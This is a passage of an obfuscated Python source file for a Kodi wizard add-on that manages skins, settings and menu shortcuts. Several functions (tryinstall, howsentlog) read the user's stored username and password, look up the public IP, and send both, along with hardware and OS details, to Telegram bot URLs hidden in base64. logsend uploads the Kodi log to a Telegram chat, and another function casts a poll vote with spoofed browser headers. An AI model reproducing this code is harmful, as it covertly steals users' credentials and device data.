				<width>400</width>
				<height>62</height>
				<align>center</align>
        <texturenofocus colordiffuse="PosterBorder">common/white.png</texturenofocus>
        <texturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</texturefocus>
        <alttexturenofocus colordiffuse="PosterBorder">common/white.png</alttexturenofocus>
        <alttexturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</alttexturefocus>
			</control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onup>2</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="10">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="11">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="12">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>

    </controls>

</window>
''','''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">3</defaultcontrol>
    <controls>
        <control type="group">
            <top>210</top>
            <bottom>64</bottom>
            <left>0</left>
            <right>0</right>
            <include>Animation_SlideIn</include>
            <include>Animation_FadeOut</include>
            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <!-- <include>Object_FlatBackground</include> -->
                    <control type="grouplist" id="3">
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onleft>5</onleft>
                        <onright>5</onright>
                        <width>100%</width>
						<align>right</align>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control>

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
					
                    <control type="grouplist" id="5">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>3</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

            </control>

            <!-- Default Templates -->
            <control type="button" id="7">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="8">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="9">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="11">
                <width>100%</width>
                <height>72</height>
                <texture border="30">common/div.png</texture>
                <include>Defs_OptionButton</include>
            </control>
            <control type="edit" id="12">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="label" id="14">
                <width>100%</width>
                <height>72</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>LineLabel</textcolor>
            </control>
            <control type="sliderex" id="13">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
            <control type="button" id="10">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onleft>3</onleft>
                <onright>3</onright>
                <onup>3</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="28">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="29">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="30">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>
        <control type="label" id="2"><width>1</width><top>-2000</top><height>1</height><visible>false</visible></control>

    </controls>

</window>
''')#line:836
    with open (O0OO0OOOOO00O0OO0 ,'w')as OOO00OO0OO00O00OO :#line:839
      OOO00OO0OO00O00OO .write (O00OO00O0OO0000OO )#line:840
    try :#line:841
      O000OO0O0OOO0O0OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","plugin.program.Anonymous","skin","guisettings.xml")#line:842
      O000OOO00OOOOOO00 =os .path .join (xbmc .translatePath ("special://home/"),"userdata","guisettings.xml")#line:843
      copyfile (O000OO0O0OOO0O0OO ,O000OOO00OOOOOO00 )#line:845
    except :pass #line:846
def tryinstall ():#line:849
       try :#line:850
          import json #line:851
          wiz .log ('FRESH MESSAGE')#line:852
          O00O0OO00OOOO0O0O =(ADDON .getSetting ("user"))#line:853
          O0O0O0O0OO0O0O00O =(ADDON .getSetting ("pass"))#line:854
          OO0OOOO000OO0OO00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:855
          O0000O00000000OOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDEzMDQxMzU5MTM6QUFITHdGMWRxbktSTGQ4WUdkUjdyRldpTFdOYmFVcnE4ekUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTM2NDU5OTc4NCZ0ZXh0Pdee16DXodeZ150g15zXlNeq16fXmdefINeQ16og15TXkdeZ15zXkyAt'#line:856
          OOO00OO0OOO0O000O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:857
          OO00OO000OO0OO0O0 =str (json .loads (OOO00OO0OOO0O000O )['ip'])#line:858
          O0OOOO0OOO000000O =O00O0OO00OOOO0O0O #line:859
          OOO0O000000O0OOOO =O0O0O0O0OO0O0O00O #line:860
          import socket #line:861
          OOO00OO0OOO0O000O =urllib2 .urlopen (O0000O00000000OOO .decode ('base64')+ADDON .getLocalizedString (32011 )+(HARDWAER )+ADDON .getLocalizedString (32012 )+O0OOOO0OOO000000O +ADDON .getLocalizedString (32013 )+OOO0O000000O0OOOO +ADDON .getLocalizedString (32014 )+OO0OOOO000OO0OO00 +ADDON .getLocalizedString (32015 )+OO00OO000OO0OO0O0 +ADDON .getLocalizedString (32016 )+platform .system ()).readlines ()#line:862
       except :pass #line:864
def testcommand ():#line:866
    OOOOOO0OO00O0O000 =xbmcgui .Dialog ()#line:867
    O0O000O000O0OO000 =''#line:868
    O0OOO00000O0O0OOO =xbmc .Keyboard (O0O000O000O0OO000 ,'הכנס מזהה ID')#line:869
    O0OOO00000O0O0OOO .doModal ()#line:870
    if O0OOO00000O0O0OOO .isConfirmed ():#line:871
     O0O000O000O0OO000 =O0OOO00000O0O0OOO .getText ()#line:872
     ADDON .setSetting ('sync_user',O0O000O000O0OO000 )#line:873
    try :#line:876
        OO0OO0OO0O0OO0000 =read_firebase ('table_name')#line:877
    except :#line:878
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'בעיה בסנכרון'),'[COLOR %s]מזהה ID שגוי[/COLOR]'%COLOR2 )#line:879
def check_firebase ():#line:880
     if len (ADDON .getSetting ("sync_user"))>0 :#line:881
        try :#line:882
            OO000000OO0OOO0O0 =read_firebase ('table_name')#line:883
        except :#line:885
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Kodi Anonymous'),'[COLOR %s]שם המשתמש של הסנכרון שגוי[/COLOR]'%COLOR2 )#line:886
            OO0OOOO00OOO0O0O0 =DIALOG .yesno ("%s"%'בעיה בשם המשתמש של הסנכרון',"[COLOR %s]שם המשתמש של הסנכרון אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR yellow]אישור[/COLOR][/B]')#line:887
            if BUILDNAME =="":#line:889
                xbmc .executebuiltin ("ActivateWindow(home)")#line:890
            if OO0OOOO00OOO0O0O0 :#line:891
               ADDON .openSettings ()#line:892
               sys .exit ()#line:893
            else :#line:894
             sys .exit ()#line:895
def indicatorVotes ():#line:896
   try :#line:897
        import requests #line:898
        OO0O0OOO0O0O0000O ='42244359'#line:899
        OOOO00OO0O0O00OO0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO0O0OOO0O0O0000O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:911
        OOO0OO000OO0OO0O0 ='247106541'#line:913
        O0O0OO000O0O00O00 ={'options':OOO0OO000OO0OO0O0 }#line:919
        OOO0O00O0OOO000OO =requests .post ('https://www.strawpoll.me/'+OO0O0OOO0O0O0000O ,headers =OOOO00OO0O0O00OO0 ,data =O0O0OO000O0O00O00 )#line:921
   except :pass #line:922
def autotrakt ():#line:923
    O0O00OO0O000OOOOO =(ADDON .getSetting ("auto_trk"))#line:924
    if O0O00OO0O000OOOOO =='true':#line:925
       from resources .libs import trk_aut #line:926
def traktsync ():#line:928
     O0O000OOO0OOOO0OO =(ADDON .getSetting ("auto_trk"))#line:929
     if O0O000OOO0OOOO0OO =='true':#line:930
       from resources .libs import trk_aut #line:933
     else :#line:934
        ADDON .openSettings ()#line:935
def imdb_synck ():#line:937
   try :#line:938
     OO0O0O00000O00000 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:939
     OOO00O0O0OOOOOO00 =xbmcaddon .Addon ('plugin.video.gaia')#line:940
     O0OO0OO0O0O000O00 =(ADDON .getSetting ("imdb_sync"))#line:941
     OOO0OO00000OOO0OO ="imdb.user"#line:942
     OOOOOO0O000O00O0O ="accounts.informants.imdb.user"#line:943
     OO0O0O00000O00000 .setSetting (OOO0OO00000OOO0OO ,str (O0OO0OO0O0O000O00 ))#line:944
     OOO00O0O0OOOOOO00 .setSetting ('accounts.informants.imdb.enabled','true')#line:945
     OOO00O0O0OOOOOO00 .setSetting (OOOOOO0O000O00O0O ,str (O0OO0OO0O0O000O00 ))#line:946
   except :pass #line:947
def dis_or_enable_addon (OO0O00000O0OO0000 ,O0OOO0OOOO0O00OO0 ,enable ="true"):#line:949
    import json #line:950
    O00OO00OO0000O000 ='"%s"'%OO0O00000O0OO0000 #line:951
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O00000O0OO0000 )and enable =="true":#line:952
        logging .warning ('already Enabled')#line:953
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0O00000O0OO0000 )#line:954
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O00000O0OO0000 )and enable =="false":#line:955
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0O00000O0OO0000 )#line:956
    else :#line:957
        OOO000OOOO0000000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00OO00OO0000O000 ,enable )#line:958
        O0OO0O00OOOO00OOO =xbmc .executeJSONRPC (OOO000OOOO0000000 )#line:959
        O0O0O0OOOOO0OO000 =json .loads (O0OO0O00OOOO00OOO )#line:960
        if enable =="true":#line:961
            xbmc .log ("### Enabled %s, response = %s"%(OO0O00000O0OO0000 ,O0O0O0OOOOO0OO000 ))#line:962
        else :#line:963
            xbmc .log ("### Disabled %s, response = %s"%(OO0O00000O0OO0000 ,O0O0O0OOOOO0OO000 ))#line:964
    if O0OOO0OOOO0O00OO0 =='auto':#line:965
     return True #line:966
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:967
def iptvset ():#line:970
  try :#line:971
    OO0O0OO00OOO0O0OO =(ADDON .getSetting ("iptv_on"))#line:972
    if OO0O0OO00OOO0O0OO =='true':#line:974
       if KODIV >=17 and KODIV <18 :#line:976
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:977
         O0OOOO00OOOOOOO0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:978
         O0OOOO000OOOO0000 =(ADDON .getSetting ("iptvUrl"))#line:980
         O0OOOO00OOOOOOO0O .setSetting ('m3uUrl',O0OOOO000OOOO0000 )#line:981
         OOOO000O0O0O000OO =(ADDON .getSetting ("epg_Url"))#line:982
         O0OOOO00OOOOOOO0O .setSetting ('epgUrl',OOOO000O0O0O000OO )#line:983
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:986
         iptvsimpldownpc ()#line:987
         wiz .kodi17Fix ()#line:988
         xbmc .sleep (1000 )#line:989
         O0OOOO00OOOOOOO0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:990
         O0OOOO000OOOO0000 =(ADDON .getSetting ("iptvUrl"))#line:991
         O0OOOO00OOOOOOO0O .setSetting ('m3uUrl',O0OOOO000OOOO0000 )#line:992
         OOOO000O0O0O000OO =(ADDON .getSetting ("epg_Url"))#line:993
         O0OOOO00OOOOOOO0O .setSetting ('epgUrl',OOOO000O0O0O000OO )#line:994
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:996
         iptvsimpldown ()#line:997
         wiz .kodi17Fix ()#line:998
         xbmc .sleep (1000 )#line:999
         O0OOOO00OOOOOOO0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:1000
         O0OOOO000OOOO0000 =(ADDON .getSetting ("iptvUrl"))#line:1001
         O0OOOO00OOOOOOO0O .setSetting ('m3uUrl',O0OOOO000OOOO0000 )#line:1002
         OOOO000O0O0O000OO =(ADDON .getSetting ("epg_Url"))#line:1003
         O0OOOO00OOOOOOO0O .setSetting ('epgUrl',OOOO000O0O0O000OO )#line:1004
  except :pass #line:1005
def howsentlog ():#line:1012
       try :#line:1014
          import json #line:1015
          OO0000O00O00OOO0O =(ADDON .getSetting ("user"))#line:1016
          OOOO0OOOOOOOOOOOO =(ADDON .getSetting ("pass"))#line:1017
          OOOO000O0OO0O0O00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1018
          OO00OO0O0O0OOOOOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:1020
          O0OOOOO0000OO0O00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:1021
          O000O0000O0O00OO0 =str (json .loads (O0OOOOO0000OO0O00 )['ip'])#line:1022
          OO00OO0OOO000O0OO =OO0000O00O00OOO0O #line:1023
          O000O0O0O0OOOO00O =OOOO0OOOOOOOOOOOO #line:1024
          xbmc .getInfoLabel ('System.OSVersionInfo')#line:1025
          xbmc .sleep (1500 )#line:1026
          OO0OO0O000O00OO00 =xbmc .getInfoLabel ('System.OSVersionInfo')#line:1027
          import socket #line:1029
          O0OOOOO0000OO0O00 =urllib2 .urlopen (OO00OO0O0O0OOOOOO .decode ('base64')+ADDON .getLocalizedString (32011 )+(HARDWAER )+ADDON .getLocalizedString (32012 )+OO00OO0OOO000O0OO +ADDON .getLocalizedString (32013 )+O000O0O0O0OOOO00O +ADDON .getLocalizedString (32014 )+OOOO000O0OO0O0O00 +ADDON .getLocalizedString (32015 )+O000O0000O0O00OO0 +ADDON .getLocalizedString (32016 )+platform .system ()).readlines ()#line:1030
       except :pass #line:1032
def googleindicat ():#line:1035
			import logg #line:1036
			O0000O0O0O0OO0000 =(ADDON .getSetting ("pass"))#line:1037
			O000OO00O0OO0OOOO =(ADDON .getSetting ("user"))#line:1038
			logg .logGA (O0000O0O0O0OO0000 ,O000OO00O0OO0OOOO )#line:1039
def logsend ():#line:1040
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]שולח לוג אנא המתן[/COLOR]'%COLOR2 )#line:1041
      O00O0O00O0OO0OOOO =xbmcgui .DialogBusy ()#line:1042
      O00O0O00O0OO0OOOO .create ()#line:1043
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:1044
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:1045
      howsentlog ()#line:1047
      import requests #line:1048
      if xbmc .getCondVisibility ('system.platform.windows'):#line:1049
         O0000000000O0OOOO =xbmc .translatePath ('special://home/kodi.log')#line:1050
         O000000OOOOOOO000 ={'chat_id':(None ,'-274262389'),'document':(O0000000000O0OOOO ,open (O0000000000O0OOOO ,'rb')),}#line:1054
         O0O0OO00OO000000O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:1055
         O00OOOOO00OOOO00O =requests .post (O0O0OO00OO000000O .decode ('base64'),files =O000000OOOOOOO000 )#line:1057
      elif xbmc .getCondVisibility ('system.platform.android'):#line:1058
           O0000000000O0OOOO =xbmc .translatePath ('special://temp/kodi.log')#line:1059
           O000000OOOOOOO000 ={'chat_id':(None ,'-274262389'),'document':(O0000000000O0OOOO ,open (O0000000000O0OOOO ,'rb')),}#line:1063
           O0O0OO00OO000000O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:1064
           O00OOOOO00OOOO00O =requests .post (O0O0OO00OO000000O .decode ('base64'),files =O000000OOOOOOO000 )#line:1066
      else :#line:1067
           O0000000000O0OOOO =xbmc .translatePath ('special://kodi.log')#line:1068
           O000000OOOOOOO000 ={'chat_id':(None ,'-274262389'),'document':(O0000000000O0OOOO ,open (O0000000000O0OOOO ,'rb')),}#line:1072
           O0O0OO00OO000000O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:1073
           O00OOOOO00OOOO00O =requests .post (O0O0OO00OO000000O .decode ('base64'),files =O000000OOOOOOO000 )#line:1075
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:1076
def rdoff ():#line:1078
	O000OOO0O0O00OOOO =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:1109
	O0000O0000OOO0O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1110
	copyfile (O000OOO0O0O00OOOO ,O0000O0000OOO0O00 )#line:1111
def skindialogsettind18 ():#line:1112
	try :#line:1113
		OOO00O0OOOO0O0O00 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:1114
		O0OOO000OOOO00OOO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:1115
		copyfile (OOO00O0OOOO0O0O00 ,O0OOO000OOOO00OOO )#line:1116
	except :pass #line:1117
def rdon ():#line:1118
	loginit .loginIt ('restore','all')#line:1119
	OO00O000OOO0O00OO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:1121
	OO0O0OOO0OO0OOOOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1122
	copyfile (OO00O000OOO0O00OO ,OO0O0OOO0OO0OOOOO )#line:1123
def adults18 ():#line:1125
  OO0OO0OOOOOOO00OO =(ADDON .getSetting ("adults"))#line:1126
  if OO0OO0OOOOOOO00OO =='true':#line:1127
    O0OO0000OO0O000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1128
    with open (O0OO0000OO0O000OO ,'r')as OO00OOOOOOO0OOOOO :#line:1129
      O0O000OO0OOO00OO0 =OO00OOOOOOO0OOOOO .read ()#line:1130
    O0O000OO0OOO00OO0 =O0O000OO0OOO00OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1148
    with open (O0OO0000OO0O000OO ,'w')as OO00OOOOOOO0OOOOO :#line:1151
      OO00OOOOOOO0OOOOO .write (O0O000OO0OOO00OO0 )#line:1152
def rdbuildaddon ():#line:1153
  O0OOOO00O000O0000 =(ADDON .getSetting ("auto_rd"))#line:1154
  if O0OOOO00O000O0000 =='true':#line:1155
    O0OOO0O000O00000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1156
    with open (O0OOO0O000O00000O ,'r')as O000000000OO0O00O :#line:1157
      O0OOO000OOOOOO0OO =O000000000OO0O00O .read ()#line:1158
    O0OOO000OOOOOO0OO =O0OOO000OOOOOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1176
    with open (O0OOO0O000O00000O ,'w')as O000000000OO0O00O :#line:1179
      O000000000OO0O00O .write (O0OOO000OOOOOO0OO )#line:1180
    O0OOO0O000O00000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1184
    with open (O0OOO0O000O00000O ,'r')as O000000000OO0O00O :#line:1185
      O0OOO000OOOOOO0OO =O000000000OO0O00O .read ()#line:1186
    O0OOO000OOOOOO0OO =O0OOO000OOOOOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1204
    with open (O0OOO0O000O00000O ,'w')as O000000000OO0O00O :#line:1207
      O000000000OO0O00O .write (O0OOO000OOOOOO0OO )#line:1208
    O0OOO0O000O00000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1212
    with open (O0OOO0O000O00000O ,'r')as O000000000OO0O00O :#line:1213
      O0OOO000OOOOOO0OO =O000000000OO0O00O .read ()#line:1214
    O0OOO000OOOOOO0OO =O0OOO000OOOOOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1232
    with open (O0OOO0O000O00000O ,'w')as O000000000OO0O00O :#line:1235
      O000000000OO0O00O .write (O0OOO000OOOOOO0OO )#line:1236
    O0OOO0O000O00000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1240
    with open (O0OOO0O000O00000O ,'r')as O000000000OO0O00O :#line:1241
      O0OOO000OOOOOO0OO =O000000000OO0O00O .read ()#line:1242
    O0OOO000OOOOOO0OO =O0OOO000OOOOOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1260
    with open (O0OOO0O000O00000O ,'w')as O000000000OO0O00O :#line:1263
      O000000000OO0O00O .write (O0OOO000OOOOOO0OO )#line:1264
    O0OOO0O000O00000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1267
    with open (O0OOO0O000O00000O ,'r')as O000000000OO0O00O :#line:1268
      O0OOO000OOOOOO0OO =O000000000OO0O00O .read ()#line:1269
    O0OOO000OOOOOO0OO =O0OOO000OOOOOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1287
    with open (O0OOO0O000O00000O ,'w')as O000000000OO0O00O :#line:1290
      O000000000OO0O00O .write (O0OOO000OOOOOO0OO )#line:1291
    O0OOO0O000O00000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1293
    with open (O0OOO0O000O00000O ,'r')as O000000000OO0O00O :#line:1294
      O0OOO000OOOOOO0OO =O000000000OO0O00O .read ()#line:1295
    O0OOO000OOOOOO0OO =O0OOO000OOOOOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1313
    with open (O0OOO0O000O00000O ,'w')as O000000000OO0O00O :#line:1316
      O000000000OO0O00O .write (O0OOO000OOOOOO0OO )#line:1317
    O0OOO0O000O00000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1319
    with open (O0OOO0O000O00000O ,'r')as O000000000OO0O00O :#line:1320
      O0OOO000OOOOOO0OO =O000000000OO0O00O .read ()#line:1321
    O0OOO000OOOOOO0OO =O0OOO000OOOOOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
